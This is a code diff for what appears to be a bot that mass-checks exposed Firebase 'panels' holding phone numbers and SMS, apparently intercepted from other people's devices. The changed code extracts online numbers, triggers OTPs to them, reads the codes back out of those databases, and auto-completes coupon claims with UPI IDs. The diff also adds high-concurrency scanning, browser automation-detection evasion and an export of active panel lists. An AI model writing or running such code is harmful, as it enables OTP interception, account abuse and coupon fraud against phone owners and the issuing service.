@@ -50,7 +50,7 @@ logger = logging.getLogger(__name__)
 
 CLAIMS_DATA_FILE = "claimed_coupons.json"  # Stores claimed coupon logs from both Direct Mobile and Firebase flows
 MAX_DIRECT_LINKS = 20  # Requires a .txt or .zip file if more than 20 links are submitted
-MAX_CONCURRENT_REQUESTS = 10  # Balanced concurrency limit for checking Firebase URLs
+MAX_CONCURRENT_REQUESTS = 50  # High concurrency limit for fast bulk Firebase URL checking
 MAX_FIREBASE_UPI_USES = 8  # Fixed usage limit per fresh UPI ID
 MAX_FIREBASE_NUMBER_USES = 8  # Fixed usage limit per verified working Firebase number (1st claim + up to 7 more)
 MAX_SEND_RETRIES = 2  # Maximum OTP send attempts per online mobile number
@@ -286,16 +286,14 @@ async def get_shared_browser(headless: bool = True, force_restart: bool = False)
             global_playwright = await async_playwright().start()
 
         global_browser = await global_playwright.chromium.launch(
-            headless=False,
+            headless=headless,
             args=[
-                "--headless=new",
                 "--disable-blink-features=AutomationControlled",
                 "--no-sandbox",
                 "--disable-setuid-sandbox",
                 "--disable-dev-shm-usage",
                 "--disable-gpu",
                 "--no-zygote",
-                "--single-process",
                 "--disable-features=IsolateOrigins,site-per-process",
                 "--ignore-certificate-errors",
             ],
@@ -699,20 +697,35 @@ async def init_user_session(chat_id: int) -> bool:
 
 
 # ==========================================
-# 3. FIREBASE STATUS CHECKER (SINGLE CHECK)
+# 3. FIREBASE STATUS CHECKER (FAST CHECK)
 # ==========================================
 _fb_http_session: Optional[requests.Session] = None
+_fb_aiohttp_session: Optional[aiohttp.ClientSession] = None
+_fb_aiohttp_lock = asyncio.Lock()
 
 
 def _get_fb_http_session() -> requests.Session:
     global _fb_http_session
     if _fb_http_session is None:
         sess = requests.Session()
-        adapter = HTTPAdapter(pool_connections=20, pool_maxsize=20, max_retries=0)
+        adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=0)
         sess.mount("https://", adapter)
         sess.mount("http://", adapter)
         _fb_http_session = sess
     return _fb_http_session
+
+
+async def _get_fb_aiohttp_session() -> aiohttp.ClientSession:
+    global _fb_aiohttp_session
+    async with _fb_aiohttp_lock:
+        if _fb_aiohttp_session is None or _fb_aiohttp_session.closed:
+            connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False)
+            _fb_aiohttp_session = aiohttp.ClientSession(
+                connector=connector,
+                trust_env=False,
+                timeout=aiohttp.ClientTimeout(total=4.5, connect=2.0, sock_read=3.0),
+            )
+        return _fb_aiohttp_session
 
 
 def _build_firebase_query_url(firebase_url: str, node_suffix: str = "") -> str:
@@ -884,47 +897,53 @@ def _is_firebase_node_online(node: dict) -> bool:
     return False
 
 
-async def is_firebase_active(fb_url: str, timeout: int = 12) -> Dict[str, Any]:
+async def is_firebase_active(fb_url: str, timeout: int = 5) -> Dict[str, Any]:
     """
-    Checks whether a Firebase database is accessible and contains any active/online source.
+    Checks whether a Firebase database is accessible and contains any active/online source
+    or recent SMS/activity (within 10 minutes / 600s).
     """
     root_url, query = _get_firebase_root_and_query(fb_url)
     check_url = f"{root_url}/.json" + (f"?{query}" if query else "")
 
     try:
-        async with aiohttp.ClientSession(trust_env=False) as session:
-            async with session.get(check_url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
-                if resp.status == 401:
-                    return {"active": False, "reason": "permission_denied", "online_count": 0}
-                if resp.status != 200:
-                    return {"active": False, "reason": f"http_{resp.status}", "online_count": 0}
+        session = await _get_fb_aiohttp_session()
+        async with session.get(check_url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
+            if resp.status == 401:
+                return {"active": False, "reason": "permission_denied", "online_count": 0}
+            if resp.status != 200:
+                return {"active": False, "reason": f"http_{resp.status}", "online_count": 0}
 
-                data = await resp.json(content_type=None)
-                if not data:
-                    return {"active": False, "reason": "empty_database", "online_count": 0}
+            data = await resp.json(content_type=None)
+            if not data:
+                return {"active": False, "reason": "empty_database", "online_count": 0}
 
-                online_count = 0
-                if isinstance(data, dict):
-                    clients_node = data.get("clients")
-                    if isinstance(clients_node, dict):
-                        for _, info in clients_node.items():
+            online_count = 0
+            if isinstance(data, dict):
+                for section in ("clients", "numbers", "devices", "users"):
+                    sec_node = data.get(section)
+                    if isinstance(sec_node, dict):
+                        for _, info in sec_node.items():
                             if isinstance(info, dict):
+                                if _is_firebase_node_offline(info):
+                                    continue
                                 state = _check_node_online_activity(info)
-                                if state is True or state is None:
+                                if state is True or _is_firebase_node_online(info):
                                     online_count += 1
 
-                    numbers_node = data.get("numbers")
-                    if isinstance(numbers_node, dict):
-                        for _, info in numbers_node.items():
-                            if isinstance(info, dict):
-                                state = _check_node_online_activity(info)
-                                if state is True or state is None:
-                                    online_count += 1
+                if online_count == 0:
+                    online_nums = _extract_online_numbers_from_tree(data)
+                    online_count = len(online_nums)
 
-                if online_count > 0:
-                    return {"active": True, "reason": "online_sources_found", "online_count": online_count}
+            if online_count > 0:
+                return {"active": True, "reason": "online_sources_found", "online_count": online_count}
 
-                return {"active": False, "reason": "no_online_sources", "online_count": 0}
+            all_ts: list[float] = []
+            flags = {"has_online_node": False}
+            _collect_timestamps_and_activity_recursive(data, all_ts, flags)
+            if all_ts and (time.time() - max(all_ts)) <= 600:
+                return {"active": True, "reason": "recent_sms_activity", "online_count": 1}
+
+            return {"active": False, "reason": "no_online_sources", "online_count": 0}
 
     except Exception as exc:
         return {"active": False, "reason": f"error:{str(exc)[:80]}", "online_count": 0}
@@ -969,40 +988,61 @@ def _collect_timestamps_and_activity_recursive(obj, timestamps: list[float], sta
             _collect_timestamps_and_activity_recursive(item, timestamps, state_flags)
 
 
+def _evaluate_firebase_payload(data: Any) -> str:
+    if data is None or data == {} or data == []:
+        return "Inactive (Database is empty)"
+
+    all_timestamps: list[float] = []
+    state_flags = {"has_online_node": False}
+    _collect_timestamps_and_activity_recursive(data, all_timestamps, state_flags)
+
+    if all_timestamps:
+        latest_ts_sec = max(all_timestamps)
+        time_diff = time.time() - latest_ts_sec
+        if time_diff <= 600:
+            secs = max(0, int(time_diff))
+            return f"Active (Last SMS/activity {secs}s ago)"
+        else:
+            mins = int(time_diff // 60)
+            return f"Inactive (Last SMS/activity {mins} min ago)"
+
+    if state_flags["has_online_node"]:
+        return "Active (Live JSON data accessible)"
+
+    return "Active (Live JSON data accessible)"
+
+
+async def check_firebase_sms_status_async(firebase_url: str) -> str:
+    """Fast async check for bulk Firebase URLs."""
+    target_url = _build_firebase_query_url(firebase_url, "")
+    try:
+        session = await _get_fb_aiohttp_session()
+        async with session.get(target_url) as resp:
+            if resp.status == 401:
+                return "Error: Permission Denied (Firebase rules are private)"
+            if resp.status >= 400:
+                return f"HTTP Error: {resp.status} ({resp.reason})"
+            data = await resp.json(content_type=None)
+            return _evaluate_firebase_payload(data)
+    except asyncio.TimeoutError:
+        return "Error: Timeout"
+    except Exception as e:
+        return f"Error: {e}"
+
+
 def check_firebase_sms_status(firebase_url: str) -> str:
     """
     Checks a single Firebase endpoint once (no repeated multi-path hits) to determine
     whether it is Active or Inactive.
     """
     target_url = _build_firebase_query_url(firebase_url, "")
-    all_timestamps: list[float] = []
-    state_flags = {"has_online_node": False}
     sess = _get_fb_http_session()
 
     try:
-        response = sess.get(target_url, timeout=(8.0, 15.0))
+        response = sess.get(target_url, timeout=(2.5, 4.0))
         response.raise_for_status()
         data = response.json()
-
-        if data is None or data == {} or data == []:
-            return "Inactive (Database is empty)"
-
-        _collect_timestamps_and_activity_recursive(data, all_timestamps, state_flags)
-
-        if all_timestamps:
-            latest_ts_sec = max(all_timestamps)
-            time_diff = time.time() - latest_ts_sec
-            if time_diff <= 600:
-                secs = max(0, int(time_diff))
-                return f"Active (Last SMS/activity {secs}s ago)"
-            else:
-                mins = int(time_diff // 60)
-                return f"Inactive (Last SMS/activity {mins} min ago)"
-
-        if state_flags["has_online_node"]:
-            return "Active (Live JSON data accessible)"
-
-        return "Active (Live JSON data accessible)"
+        return _evaluate_firebase_payload(data)
 
     except requests.exceptions.HTTPError as e:
         if e.response is not None and e.response.status_code == 401:
@@ -1181,8 +1221,7 @@ def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inhe
             branch_online = node_online or ("online" in key_lower)
 
             if branch_online:
-                key_nums = re.findall(number_pattern, str(key))
-                for n in key_nums:
+                for n in re.findall(number_pattern, str(key)):
                     if n not in results:
                         results.append(n)
 
@@ -1195,9 +1234,8 @@ def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inhe
                 for n in sub_nums:
                     if n not in results:
                         results.append(n)
-            elif branch_online and val is not None and isinstance(val, dict):
-                val_nums = re.findall(number_pattern, str(val))
-                for n in val_nums:
+            elif branch_online and val is not None:
+                for n in re.findall(number_pattern, str(val)):
                     if n not in results:
                         results.append(n)
 
@@ -1240,41 +1278,92 @@ def _clean_ten_digit_indian_number(val: Any) -> Optional[str]:
     return None
 
 
+def _extract_number_from_node_or_key(key: Any, info: Any) -> Optional[str]:
+    if isinstance(info, dict):
+        for field in ("number", "phone", "mobNo", "mobile", "phoneNumber", "simNumber", "sim1", "sim_number"):
+            if field in info:
+                cleaned = _clean_ten_digit_indian_number(info[field])
+                if cleaned:
+                    return cleaned
+        for nest in ("Info", "info", "deviceInfo", "DeviceInfo", "meta", "Meta", "device"):
+            sub = info.get(nest)
+            if isinstance(sub, dict):
+                cleaned = _extract_number_from_node_or_key(key, sub)
+                if cleaned:
+                    return cleaned
+    elif isinstance(info, str):
+        cleaned = _clean_ten_digit_indian_number(info)
+        if cleaned:
+            return cleaned
+    return _clean_ten_digit_indian_number(key)
+
+
 def get_online_numbers(firebase_url: str) -> list[dict]:
-    """Fetches numbers with 'online' status from Firebase /numbers.json or /clients.json."""
+    """Fetches numbers with 'online' status from Firebase /numbers.json, /clients.json, or root/devices."""
     root_url, query = _get_firebase_root_and_query(firebase_url)
     q_suffix = f"?{query}" if query else ""
 
-    for node in ("numbers.json", "clients.json"):
+    for node in ("numbers.json", "clients.json", "devices.json", "users.json"):
         target = f"{root_url}/{node}{q_suffix}"
         try:
-            res = requests.get(target, timeout=10)
+            res = requests.get(target, timeout=5)
             if res.status_code == 200 and res.json():
                 data = res.json()
                 online_list = []
-
                 if isinstance(data, dict):
                     for key, info in data.items():
-                        if not isinstance(info, dict):
-                            continue
-                        status_str = str(info.get("status", "")).lower()
-                        is_on = (status_str == "online") or _is_firebase_node_online(info)
-                        if is_on:
-                            raw_num = (
-                                info.get("number")
-                                or info.get("phone")
-                                or info.get("mobNo")
-                                or info.get("mobile")
-                                or key
-                            )
-                            cleaned = _clean_ten_digit_indian_number(raw_num)
-                            if cleaned:
-                                online_list.append({"id": key, "number": cleaned})
+                        if isinstance(info, dict) and _is_firebase_node_online(info):
+                            cleaned = _extract_number_from_node_or_key(key, info)
+                            if cleaned and not any(x["number"] == cleaned for x in online_list):
+                                online_list.append({"id": str(key), "number": cleaned})
                 if online_list:
                     return online_list
         except Exception as e:
             print(f"  [Error] Failed to fetch online numbers from Firebase ({target}): {e}")
+
+    root_target = _build_firebase_query_url(firebase_url, "")
+    try:
+        res = requests.get(root_target, timeout=5)
+        if res.status_code == 200 and res.json():
+            data = res.json()
+            online_list = []
+            if isinstance(data, dict):
+                for section in ("clients", "numbers", "devices", "users", "all_user", "all_users"):
+                    sec = data.get(section)
+                    if isinstance(sec, dict):
+                        for key, info in sec.items():
+                            if isinstance(info, dict) and _is_firebase_node_online(info):
+                                cleaned = _extract_number_from_node_or_key(key, info)
+                                if cleaned and not any(x["number"] == cleaned for x in online_list):
+                                    online_list.append({"id": str(key), "number": cleaned})
+                if not online_list:
+                    for num in _extract_online_numbers_from_tree(data):
+                        if not any(x["number"] == num for x in online_list):
+                            online_list.append({"id": None, "number": num})
+            return online_list
+    except Exception:
+        pass
+
     return []
+
+
+def _panel_has_recent_sms_or_activity(firebase_url: str, max_age_sec: int = 600) -> bool:
+    """Checks whether a Firebase panel has any SMS or activity within max_age_sec (default 10 min)."""
+    target_url = _build_firebase_query_url(firebase_url, "")
+    try:
+        res = requests.get(target_url, timeout=4)
+        if res.status_code == 200 and res.json():
+            data = res.json()
+            timestamps: list[float] = []
+            flags = {"has_online_node": False}
+            _collect_timestamps_and_activity_recursive(data, timestamps, flags)
+            if timestamps and (time.time() - max(timestamps)) <= max_age_sec:
+                return True
+            if flags["has_online_node"]:
+                return True
+    except Exception:
+        pass
+    return False
 
 
 def trigger_otp_send(number: str, otp_sender_fn: Optional[Callable[[str], bool]] = None) -> bool:
@@ -1314,11 +1403,12 @@ def check_otp_in_firebase(firebase_url: str, number_id: str) -> Optional[str]:
 def clear_old_otp(firebase_url: str, number_id: str) -> None:
     """Clears stale OTP entries before dispatching a new OTP."""
     root_url, query = _get_firebase_root_and_query(firebase_url)
-    target = f"{root_url}/numbers/{number_id}.json" + (f"?{query}" if query else "")
-    try:
-        requests.patch(target, json={"otp": ""}, timeout=5)
-    except Exception:
-        pass
+    for path in (f"numbers/{number_id}", f"clients/{number_id}"):
+        target = f"{root_url}/{path}.json" + (f"?{query}" if query else "")
+        try:
+            requests.patch(target, json={"otp": ""}, timeout=4)
+        except Exception:
+            pass
 
 
 def process_all_panels(
@@ -1386,7 +1476,7 @@ def _fetch_numbers_from_single_firebase_sync(firebase_url: str) -> list[str]:
     found_numbers = []
 
     try:
-        resp = requests.get(target_url, timeout=12)
+        resp = requests.get(target_url, timeout=6)
         if resp.status_code == 200 and resp.json():
             data = resp.json()
             online_nums = _extract_online_numbers_from_tree(data, inherited_offline=False, inherited_online=False)
@@ -1399,23 +1489,27 @@ def _fetch_numbers_from_single_firebase_sync(firebase_url: str) -> list[str]:
     return found_numbers
 
 
+def _record_used_item_bounded(lst: list[str], item: str, max_len: int = 500) -> None:
+    if item in lst:
+        lst.remove(item)
+    lst.append(item)
+    if len(lst) > max_len:
+        del lst[: len(lst) - max_len]
+
+
 async def fetch_random_active_number_from_panels(context: ContextTypes.DEFAULT_TYPE) -> Optional[dict]:
     """
-    Fetches an active online number from saved Active Firebase Panels
+    Fetches an active online number from saved Firebase Panels in order
     (via /numbers.json or /clients.json first, falling back to single-URL tree scanning).
     """
-    session_panels: dict = context.user_data.get("session_panels", {})
-    active_endpoints = [
-        ep for ep, info in session_panels.items() if info.get("is_active")
-    ]
-    if not active_endpoints:
+    ordered_endpoints = _get_ordered_saved_firebase_endpoints(context)
+    if not ordered_endpoints:
         return None
 
-    random.shuffle(active_endpoints)
     used_numbers: list[str] = context.user_data.setdefault("used_firebase_numbers", [])
 
     all_candidates = []
-    for ep in active_endpoints:
+    for ep in ordered_endpoints:
         structured_online = await asyncio.to_thread(get_online_numbers, ep)
         if structured_online:
             for item in structured_online:
@@ -1439,15 +1533,13 @@ async def fetch_random_active_number_from_panels(context: ContextTypes.DEFAULT_T
         return None
 
     fresh_candidates = [c for c in all_candidates if c["number"] not in used_numbers]
-    chosen = random.choice(fresh_candidates if fresh_candidates else all_candidates)
-
-    if chosen["number"] not in used_numbers:
-        used_numbers.append(chosen["number"])
+    chosen = fresh_candidates[0] if fresh_candidates else all_candidates[0]
+    _record_used_item_bounded(used_numbers, chosen["number"])
 
     return chosen
 
 
-def _http_raw_sync(method: str, url: str, timeout: float = 8) -> tuple[int, Optional[dict]]:
+def _http_raw_sync(method: str, url: str, timeout: float = 5) -> tuple[int, Optional[dict]]:
     try:
         res = requests.request(method, url, timeout=timeout)
         try:
@@ -1459,7 +1551,7 @@ def _http_raw_sync(method: str, url: str, timeout: float = 8) -> tuple[int, Opti
         return 0, None
 
 
-async def _http_raw(method: str, url: str, timeout: float = 8) -> tuple[int, Optional[dict]]:
+async def _http_raw(method: str, url: str, timeout: float = 5) -> tuple[int, Optional[dict]]:
     return await asyncio.to_thread(_http_raw_sync, method, url, timeout)
 
 
@@ -1485,6 +1577,8 @@ async def fetch_otp_from_firebase(
         f"{base}/user_sms/{cid}.json",
         f"{base}/sms/{cid}.json",
         f"{base}/Sms/{cid}.json",
+        f"{base}/numbers/{cid}.json",
+        f"{base}/clients/{cid}.json",
     ] if cid else [
         f"{base}/messages.json",
         f"{base}/All_User/Sms.json",
@@ -1498,14 +1592,20 @@ async def fetch_otp_from_firebase(
 
     text_fields = (
         "body", "message", "text", "sms", "msg", "content",
-        "message_body", "Message", "Body", "Text", "SMS",
+        "message_body", "Message", "Body", "Text", "SMS", "otp", "OTP",
     )
 
     while time.time() - start < timeout:
         for url in paths:
-            status, data = await _http_raw("GET", url, timeout=8)
+            status, data = await _http_raw("GET", url, timeout=4)
             if status != 200 or not isinstance(data, dict) or not data:
                 continue
+
+            if "otp" in data and data["otp"] is not None:
+                matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(data["otp"]).strip())
+                if matched and matched.group(1) not in exclude:
+                    return matched.group(1)
+
             for mid in sorted(data.keys(), reverse=True):
                 msg = data[mid]
                 if not isinstance(msg, dict):
@@ -1543,42 +1643,43 @@ def _poll_otp_for_number_sync(firebase_url: str, number: str, number_id: Optiona
     """
     root_url, query = _get_firebase_root_and_query(firebase_url)
     q_suffix = f"?{query}" if query else ""
-    target_url = (
-        f"{root_url}/numbers/{number_id}/otp.json{q_suffix}"
-        if number_id
-        else _build_firebase_query_url(firebase_url, "")
-    )
+    target_urls = []
+    if number_id:
+        target_urls.append(f"{root_url}/numbers/{number_id}/otp.json{q_suffix}")
+        target_urls.append(f"{root_url}/clients/{number_id}/otp.json{q_suffix}")
+    target_urls.append(_build_firebase_query_url(firebase_url, ""))
 
     for _ in range(WAIT_SECONDS):
-        try:
-            res = requests.get(target_url, timeout=5)
-            if res.status_code == 200 and res.json() is not None:
-                payload_val = res.json()
-                if isinstance(payload_val, dict):
-                    for mid in sorted(payload_val.keys(), reverse=True):
-                        msg = payload_val[mid]
-                        if isinstance(msg, dict):
-                            text = ""
-                            for f in (
-                                "body", "message", "text", "sms", "msg", "content",
-                                "message_body", "Message", "Body", "Text", "SMS",
-                            ):
-                                v = msg.get(f)
-                                if v:
-                                    text = str(v)
-                                    break
-                            if text and any(kw in text.lower() for kw in OTP_KEYWORDS):
-                                for pat in OTP_PATTERNS:
-                                    m = pat.search(text)
-                                    if m:
-                                        otp = re.sub(r"\D", "", m.group(1) if m.groups() else m.group(0))
-                                        if len(otp) == 6 and otp not in baseline_otps:
-                                            return otp
-                matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(payload_val).strip())
-                if matched and matched.group(1) not in baseline_otps:
-                    return matched.group(1)
-        except Exception:
-            pass
+        for target_url in target_urls:
+            try:
+                res = requests.get(target_url, timeout=4)
+                if res.status_code == 200 and res.json() is not None:
+                    payload_val = res.json()
+                    if isinstance(payload_val, dict):
+                        for mid in sorted(payload_val.keys(), reverse=True):
+                            msg = payload_val[mid]
+                            if isinstance(msg, dict):
+                                text = ""
+                                for f in (
+                                    "body", "message", "text", "sms", "msg", "content",
+                                    "message_body", "Message", "Body", "Text", "SMS", "otp", "OTP",
+                                ):
+                                    v = msg.get(f)
+                                    if v:
+                                        text = str(v)
+                                        break
+                                if text and any(kw in text.lower() for kw in OTP_KEYWORDS):
+                                    for pat in OTP_PATTERNS:
+                                        m = pat.search(text)
+                                        if m:
+                                            otp = re.sub(r"\D", "", m.group(1) if m.groups() else m.group(0))
+                                            if len(otp) == 6 and otp not in baseline_otps:
+                                                return otp
+                    matched = re.search(r'(?<!\d)(\d{6})(?!\d)', str(payload_val).strip())
+                    if matched and matched.group(1) not in baseline_otps:
+                        return matched.group(1)
+            except Exception:
+                pass
         time.sleep(1)
     return None
 
@@ -1588,7 +1689,7 @@ def _get_baseline_otps_sync(firebase_url: str) -> list[str]:
     target_url = _build_firebase_query_url(firebase_url, "")
     existing = []
     try:
-        res = requests.get(target_url, timeout=6)
+        res = requests.get(target_url, timeout=4)
         if res.status_code == 200 and res.json():
             raw_dump = json.dumps(res.json(), ensure_ascii=False)
             for o in extract_numbers_and_otps(raw_dump).get("otps", []):
@@ -1638,6 +1739,51 @@ def _pin_or_increment_working_number(context: ContextTypes.DEFAULT_TYPE, phone: 
     return new_pin
 
 
+def _get_ordered_saved_firebase_endpoints(context: ContextTypes.DEFAULT_TYPE) -> list[str]:
+    """Returns saved Firebase endpoints in the exact order submitted by the user."""
+    session_panels: dict = context.user_data.get("session_panels", {})
+    return list(session_panels.keys())
+
+
+def _mark_panel_status_in_session(context: ContextTypes.DEFAULT_TYPE, fb_url: str, is_active: bool, reason: str = "") -> None:
+    session_panels: dict = context.user_data.get("session_panels", {})
+    info = session_panels.get(fb_url)
+    if isinstance(info, dict):
+        info["is_active"] = is_active
+        info["status"] = f"Active ({reason})" if is_active and reason else ("Active" if is_active else f"Inactive ({reason})")
+        info["checked_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+
+async def _send_active_panels_txt_file(message_target, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Creates and sends a .txt file (GBX_PANNEL.txt) containing all verified active Firebase panel URLs."""
+    session_panels: dict = context.user_data.get("session_panels", {})
+    active_urls = [
+        ep for ep, info in session_panels.items()
+        if isinstance(info, dict) and info.get("is_active")
+    ]
+    if not active_urls:
+        return
+
+    unique_active_urls = list(dict.fromkeys(active_urls))
+    tmp_path = None
+    try:
+        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt", encoding="utf-8") as tmp:
+            tmp.write("\n".join(unique_active_urls) + "\n")
+            tmp_path = tmp.name
+
+        with open(tmp_path, "rb") as f:
+            await message_target.reply_document(
+                document=f,
+                filename="GBX_PANNEL.txt",
+                caption=f"📄 GBX PANNEL — Active Panels ({len(unique_active_urls)})",
+            )
+    except Exception as e:
+        logger.warning(f"Failed to send GBX_PANNEL.txt: {e}")
+    finally:
+        if tmp_path and os.path.exists(tmp_path):
+            os.remove(tmp_path)
+
+
 async def auto_claim_triplet_on_woohoo(
     context: ContextTypes.DEFAULT_TYPE,
     coupon_code: str,
@@ -1645,28 +1791,16 @@ async def auto_claim_triplet_on_woohoo(
     progress_callback: Optional[Callable[[str, list[str]], Awaitable[None]]] = None,
 ) -> dict:
     """
-    Executes the full automated claim workflow for an Online Number + Coupon + UPI triplet:
-    1. Reserves the UPI ID for automatic submission in Step 3.
-    2. Locks the current coupon code until it is successfully claimed.
-    3. Reuses a verified working number up to 8 times (or tries online numbers in Active Firebase Panels
-       with up to 2 retries and 10-second polling per number).
+    Executes the full automated claim workflow for an Online Number + Coupon + UPI triplet
+    panel-by-panel in order:
+    1. Checks the first saved Firebase panel for recent SMS/activity (within 10m / 10s check) and fetches online numbers.
+    2. Dispatches OTP to an online number and polls/fetches OTP; if none arrives, checks the next online number in that panel.
+    3. Once all numbers in the current panel are exhausted, switches to the next saved Firebase panel in order.
     4. Automatically completes Step 2 (OTP Verification) and Step 3 (UPI Submission).
     """
-    session_panels: dict = context.user_data.get("session_panels", {})
-    active_endpoints = [
-        ep for ep, info in session_panels.items() if info.get("is_active")
-    ]
-    if not active_endpoints:
-        return {"success": False, "reason": "NO_ACTIVE_PANELS", "message": "No active Firebase panels found.", "failed_logs": []}
-
-    verified_endpoints: list[str] = []
-    for ep in active_endpoints:
-        fb_check = await is_firebase_active(ep)
-        if fb_check.get("active"):
-            verified_endpoints.append(ep)
-    if not verified_endpoints:
-        return {"success": False, "reason": "NO_ACTIVE_PANELS", "message": "No accessible/active Firebase databases found.", "failed_logs": []}
-    active_endpoints = verified_endpoints
+    ordered_endpoints = _get_ordered_saved_firebase_endpoints(context)
+    if not ordered_endpoints:
+        return {"success": False, "reason": "NO_ACTIVE_PANELS", "message": "No saved Firebase panels found.", "failed_logs": []}
 
     used_numbers: list[str] = context.user_data.setdefault("used_firebase_numbers", [])
     used_otps_global: list[str] = context.user_data.setdefault("used_firebase_otps", [])
@@ -1682,15 +1816,18 @@ async def auto_claim_triplet_on_woohoo(
 
     ordered_queue: list[tuple[str, dict]] = []
     pinned_num = _get_pinned_working_number(context)
-    if pinned_num:
+    if pinned_num and pinned_num.get("endpoint") in ordered_endpoints:
         ordered_queue.append((
             pinned_num["endpoint"],
             {"id": pinned_num.get("id"), "number": pinned_num["number"], "is_pinned": True},
         ))
 
-    for fb_url in active_endpoints:
-        await _notify_progress(f"Scanning online numbers from {fb_url}...")
+    for panel_idx, fb_url in enumerate(ordered_endpoints, 1):
+        await _notify_progress(f"Panel {panel_idx}/{len(ordered_endpoints)}: Checking {fb_url}...")
+
+        has_recent = await asyncio.to_thread(_panel_has_recent_sms_or_activity, fb_url, 600)
         structured_online = await asyncio.to_thread(get_online_numbers, fb_url)
+
         candidates = []
         if structured_online:
             for item in structured_online:
@@ -1701,7 +1838,12 @@ async def auto_claim_triplet_on_woohoo(
                 candidates.append({"id": None, "number": num, "is_pinned": False})
 
         if not candidates:
+            if not has_recent:
+                _mark_panel_status_in_session(context, fb_url, False, "No online numbers / recent SMS")
+            failed_logs.append(f"⚠️ Panel {panel_idx} — No online numbers, switching to next panel...")
             continue
+
+        _mark_panel_status_in_session(context, fb_url, True, f"{len(candidates)} online numbers")
 
         seen_in_panel: set[str] = set()
         if pinned_num and pinned_num["endpoint"] == fb_url:
@@ -1725,8 +1867,8 @@ async def auto_claim_triplet_on_woohoo(
         num_id = item["id"]
         is_pinned_item = bool(item.get("is_pinned"))
 
-        if not is_pinned_item and phone not in used_numbers:
-            used_numbers.append(phone)
+        if not is_pinned_item:
+            _record_used_item_bounded(used_numbers, phone)
 
         await _notify_progress(f"Initializing session for {phone}...")
 
@@ -1883,8 +2025,7 @@ async def auto_claim_triplet_on_woohoo(
                 dynamic_token = res_2["token"]
 
             if res_2.get("error", True):
-                if received_otp not in used_otps_global:
-                    used_otps_global.append(received_otp)
+                _record_used_item_bounded(used_otps_global, received_otp)
                 if is_pinned_item:
                     context.user_data["pinned_firebase_number"] = None
                 err_2 = str(res_2.get("messageBody") or res_2)
@@ -1922,8 +2063,8 @@ async def auto_claim_triplet_on_woohoo(
 
             res_3 = await safe_post_json(client, API_ENDPOINT, payload_step_3)
             if not res_3.get("error", True):
-                if received_otp not in used_otps_global:
-                    used_otps_global.append(received_otp)
+                _record_used_item_bounded(used_otps_global, received_otp)
+                _mark_panel_status_in_session(context, fb_url, True, "Verified working")
                 success_msg = res_3.get("messageBody") or "Coupon successfully claimed!"
                 pin_info = _pin_or_increment_working_number(context, phone, fb_url, num_id)
                 return {
@@ -2243,7 +2384,7 @@ async def get_leaderboard_text(current_user_id: int) -> str:
 # 5. SESSION STORAGE HELPERS
 # ==========================================
 def save_panels_to_user_session(context: ContextTypes.DEFAULT_TYPE, new_results: list[dict]) -> int:
-    """Saves all checked panels (active and inactive) to the user's active session."""
+    """Saves panels to the user's active session while preserving submission order."""
     if "session_panels" not in context.user_data:
         context.user_data["session_panels"] = {}
 
@@ -2251,11 +2392,13 @@ def save_panels_to_user_session(context: ContextTypes.DEFAULT_TYPE, new_results:
 
     for item in new_results:
         endpoint = item["firebase_endpoint"]
+        status_str = item.get("status", "Saved (Pending live check)")
+        is_active = item.get("is_active", status_str.startswith("Active"))
         session_panels[endpoint] = {
             "submitted_url": item["submitted_url"],
             "firebase_endpoint": endpoint,
-            "status": item["status"],
-            "is_active": item["status"].startswith("Active"),
+            "status": status_str,
+            "is_active": is_active,
             "checked_at": item["timestamp"],
         }
 
@@ -2272,7 +2415,7 @@ async def check_single_url_worker(
     on_done_callback: Optional[Callable[[dict], Awaitable[None]]] = None,
 ) -> dict:
     async with semaphore:
-        fb_status = await asyncio.to_thread(check_firebase_sms_status, extracted_firebase)
+        fb_status = await check_firebase_sms_status_async(extracted_firebase)
 
     result = {
         "submitted_url": original_url,
@@ -2325,35 +2468,23 @@ async def process_text_data_for_bot(
     numbers = extracted_data["numbers"]
     otps = extracted_data["otps"]
 
-    valid_results = []
     output_blocks = []
-    has_active = False
+    has_saved_panels = False
 
     if valid_pairs:
-        total_pairs = len(valid_pairs)
-        checked_counter = 0
-        progress_lock = asyncio.Lock()
-
-        async def _item_done(item_res: dict):
-            nonlocal checked_counter
-            async with progress_lock:
-                checked_counter += 1
-                current_done = checked_counter
-            if callable(link_progress_callback):
-                try:
-                    await link_progress_callback(current_done, total_pairs, item_res)
-                except Exception:
-                    pass
-
-        semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
-        tasks = [
-            check_single_url_worker(semaphore, orig_url, fb_url, on_done_callback=_item_done)
+        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        saved_items = [
+            {
+                "submitted_url": orig_url,
+                "firebase_endpoint": fb_url,
+                "status": "Saved (Queued for live check)",
+                "is_active": True,
+                "timestamp": now_str,
+            }
             for orig_url, fb_url in valid_pairs
         ]
-        valid_results = await asyncio.gather(*tasks)
-
-        has_active = any(item["status"].startswith("Active") for item in valid_results)
-        total_in_session = save_panels_to_user_session(context, valid_results)
+        total_in_session = save_panels_to_user_session(context, saved_items)
+        has_saved_panels = True
 
         rejected_note = (
             f"\n⚠️ *({rejected_count} invalid/non-Firebase links were ignored)*"
@@ -2362,11 +2493,11 @@ async def process_text_data_for_bot(
         )
 
         output_blocks.append(
-            f"✅ **Found `{len(valid_results)}` Valid Firebase Endpoints and Saved to Session**\n"
+            f"✅ **Found `{len(saved_items)}` Valid Firebase Endpoints and Saved to Session**\n"
             f"📌 *(Total panels saved in current session: `{total_in_session}`)*"
             f"{rejected_note}\n"
         )
-        for idx, item in enumerate(valid_results, 1):
+        for idx, item in enumerate(saved_items, 1):
             block = (
                 f"**[{idx}] Endpoint :** `{item['firebase_endpoint']}`\n"
                 f"      **Status   :** {item['status']}\n"
@@ -2388,7 +2519,7 @@ async def process_text_data_for_bot(
             f"  • **OTPs / Codes   :** `{otps_str}`"
         )
 
-    if not valid_results and not urls_found and not numbers and not otps:
